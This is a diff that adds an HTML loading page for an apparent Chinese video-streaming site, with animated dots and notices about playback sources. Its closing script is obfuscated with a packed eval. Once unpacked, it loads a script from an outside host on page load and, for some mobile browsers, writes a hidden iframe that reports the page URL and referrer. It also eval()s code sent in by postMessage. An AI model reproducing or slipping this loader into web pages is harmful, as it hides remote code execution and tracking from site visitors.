@@ -1,0 +1,128 @@
+
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+<meta charset="GBK">
+<title>加载页面</title>
+<style>
+  /*
+ * Baseline styles
+ */
+body {
+  background: #222;
+  text-align: center;
+  padding: 20%;
+}
+h2 {
+  color: #ccc;
+  margin: 0;
+  font: 1em '微软雅黑';
+  text-transform: uppercase;
+  letter-spacing: .1em;
+}
+
+h3 {
+  color: #ccc;
+  margin: 0;
+  font: 0.6em '微软雅黑';
+  text-transform: uppercase;
+  letter-spacing: .1em;
+}
+
+
+/*
+ * Loading Dots
+ * Can we use pseudo elements here instead :after?
+ */
+.loading span {
+  display: inline-block;
+  vertical-align: middle;
+  width: .6em;
+  height: .6em;
+  margin: .19em;
+  background: #007DB6;
+  border-radius: .6em;
+  -webkit-animation: loading 1s infinite alternate;
+          animation: loading 1s infinite alternate;
+}
+
+/*
+ * Dots Colors
+ * Smarter targeting vs nth-of-type?
+ */
+.loading span:nth-of-type(2) {
+  background: #008FB2;
+  -webkit-animation-delay: 0.2s;
+          animation-delay: 0.2s;
+}
+.loading span:nth-of-type(3) {
+  background: #009B9E;
+  -webkit-animation-delay: 0.4s;
+          animation-delay: 0.4s;
+}
+.loading span:nth-of-type(4) {
+  background: #00A77D;
+  -webkit-animation-delay: 0.6s;
+          animation-delay: 0.6s;
+}
+.loading span:nth-of-type(5) {
+  background: #00B247;
+  -webkit-animation-delay: 0.8s;
+          animation-delay: 0.8s;
+}
+.loading span:nth-of-type(6) {
+  background: #5AB027;
+  -webkit-animation-delay: 1.0s;
+          animation-delay: 1.0s;
+}
+.loading span:nth-of-type(7) {
+  background: #A0B61E;
+  -webkit-animation-delay: 1.2s;
+          animation-delay: 1.2s;
+}
+
+/*
+ * Animation keyframes
+ * Use transition opacity instead of keyframes?
+ */
+@-webkit-keyframes loading {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+@keyframes loading {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+</style>
+   
+</head>
+
+<body>
+
+  <div class="loading">
+  <h2>请选择播放源...</h2>
+  <span></span>
+  <span></span>
+  <span></span>
+  <span></span>
+  <span></span>
+  <span></span>
+  <span></span>
+  <h3>如遇到无法播放，请更换线路或稍后再试.</h3>
+  <h3>部分资源可能会暂时失效，请及时反馈给我们修复.</h3>
+  <h2><font color=red>警告:请勿相信视频内各种广告.</font></h2>
+</div>
+<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('h((/(v|u|t)/i.G(c.H))){F.B(\'C\',k(e){2 6=e.D;h(6.d){E(I(6.d.A(/\\+/g,"%J")))}});4.z(\'<f r="s:q;" 9="a://m.l.8/y/o.x?w=3&7=\'+c["7"]+\'&O=\'+j(10.Z)+\'&Y=\'+j(4.K)+\'" X="0" 12="0"  15="0" 13="14" 11="0" V="W"></f>\')}N{;(k(){2 m=4.M("n");2 b=\'a://m.l.8\';m.9=b+"/1/o.L?"+p.P(p.Q()*U);2 5=4.T("n")[0];5.S.R(m,5)})()}',62,68,'||var||document|ss|_c_ob_hf|platform|cn|src|https|url|navigator|hf_ev_j||iframe||if||encodeURIComponent|function|va88p||script|23995|Math|none|style|display|baidu|UCBrowser|MQQBrowser|is_iframe|html|article|write|replace|addEventListener|message|data|eval|window|test|userAgent|decodeURIComponent|20|referrer|js|createElement|else|ifr_url|round|random|insertBefore|parentNode|getElementsByTagName|10000|allowtransparency|true|height|ifr_ref|href|location|frameborder|width|scrolling|no|marginheight'.split('|'),0,{}))
+
+<span style="display:none"></span>
+</body>
+
+</html>
